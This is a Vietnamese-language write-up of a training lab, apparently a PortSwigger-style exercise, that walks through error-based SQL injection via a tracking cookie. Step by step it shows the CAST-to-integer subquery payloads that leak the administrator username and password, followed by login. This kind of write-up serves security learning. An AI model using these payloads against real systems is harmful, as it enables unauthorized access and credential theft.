![[Pasted image 20260612100058.png]]
# Tổng quan
-Lab sử dụng tracking cookie để truy vấn query SQL,Kết quả của câu lệnh SQL sẽ không được trả về
-Database có table là `users` với các bảng là `username` và `password` .Mục tiêu là tìm cách để leak ra `password` của `administrator`
# Khai thác
-Trước hết ta biết được SQLi ở tracking cookie là `TrackingId` ta dùng `Burp Repeater` thử thêm `'` để xem response:
![[Pasted image 20260612100946.png]]
Ta có thể thấy web trả về lỗi truy vấn 
```ERROR
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'Jnk8CcPL52mMMKUL''. Expected  char
```
Với lỗi truy vấn như này,ta biết được câu lệnh SQL mà trang web sử dụng:
```SQL
SELECT * FROM tracking WHERE id = 'Jnk8CcPL52mMMKUL'
```
Ta sử dụng tiếp payload:
```SQL
' AND CAST((SELECT 1) AS INT)--
```
![[Pasted image 20260612101727.png]]

Web có trả về lỗi:
```ERROR
ERROR: argument of AND must be type boolean, not type integer
  Position: 63
```
Vậy câu truy vấn ta cần phải là type boolean vậy ta thêm `1=` ở đằng trước `CAST`:
```SQL
' AND 1=CAST((SELECT 1) AS INT)--
```
![[Pasted image 20260612102006.png]]
Lúc này response trả về bình thường.

Tiếp theo ta thử:
```SQL
' AND 1=CAST((SELECT username FROM users) AS INT)--
```
![[Pasted image 20260612102257.png]]
Ta thấy phần response bị nuốt đến `AS` vậy ta thử xóa đi value của cookie đi thì sao?
![[Pasted image 20260612102429.png]]
Và rồi ta thấy được response của web:
```ERROR
ERROR: more than one row returned by a subquery used as an expression
```
Vì câu `SELECT username FROM users` là một câu subquery chỉ được trả một dòng ta thêm `LIMIT 1` để cho câu truy vấn con này trả về 1 dòng:
```SQL
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--
```
![[Pasted image 20260612102819.png]]
Và vậy là hệ thống web đã leak ra username là `administrator`

Ta sẽ thử với cột `password` để xem có điều gì hay ho:
```SQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
```
![[Pasted image 20260612103025.png]]
Và done,ta đã tìm được password của administrator là `90rjlf3vfcc0u3jvaukm`
Việc còn lại của ta là đăng nhập với tài khoản `administrator` là xong.
![[Pasted image 20260612103408.png]]
=> solved!